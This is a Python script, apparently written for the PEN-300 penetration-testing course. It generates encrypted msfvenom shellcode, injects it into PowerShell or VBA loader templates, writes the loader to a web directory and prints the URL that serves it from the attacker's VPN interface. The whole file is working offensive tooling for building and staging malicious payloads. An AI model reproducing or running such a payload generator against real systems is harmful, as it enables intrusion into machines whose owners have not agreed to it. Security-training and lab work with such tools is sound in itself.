#!/usr/bin/python3

import os
import subprocess
from lib.functions import get_payload, generate_command
from lib.shellcode import encrypt_shellcode
from temps.ps_templates import templates_dict
import netifaces


def main(args):
    base_path = "/home/tijmen/pen300/www/pl"

    payload = get_payload(args.format, args.arch, args.conn)
    command = generate_command(payload, args)

    shellcode = generate_shellcode(command, args.format)
    if not shellcode:
        print("Shellcode not generate")
        quit()

    generate_payload(args, command, shellcode, base_path)


def generate_shellcode(command, format):
    try:
        encrypted_shellcode = encrypt_shellcode(command, format)
        buf = f'[Byte[]] $buf = {",".join(encrypted_shellcode)}'
        return buf
    except subprocess.CalledProcessError as e:
        print(f"An error occurred while executing the command: {e}")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        quit()


def generate_payload(args, command, shellcode, base_path):
    try:
        if args.format == "vba-ps":
            template = "default"
        else:
            template = args.template
        template = templates_dict[template]
    except Exception as e:
        raise ValueError("Unsupported format for template")
        quit()
    try:
        command_added = template.replace("MSFVENOM", " ".join(command))
        final_output = command_added.replace("SHELLCODE", shellcode)
        output_path = f"{base_path}/run.txt"
        if os.path.exists(output_path):
            os.remove(output_path)
        with open(output_path, "w+") as file_obj:
            file_obj.write(final_output)

        addresses = netifaces.ifaddresses('tun0')
        ip_address = addresses[netifaces.AF_INET][0]['addr']

        print(f"See '{output_path}' for your source-code\n")
        print(f"Saved at: {output_path}")
        print(f"Served at: http://{ip_address}/pl/run.txt")
    except Exception as e:
        print(f"Error creating the template: {e}")
        quit()
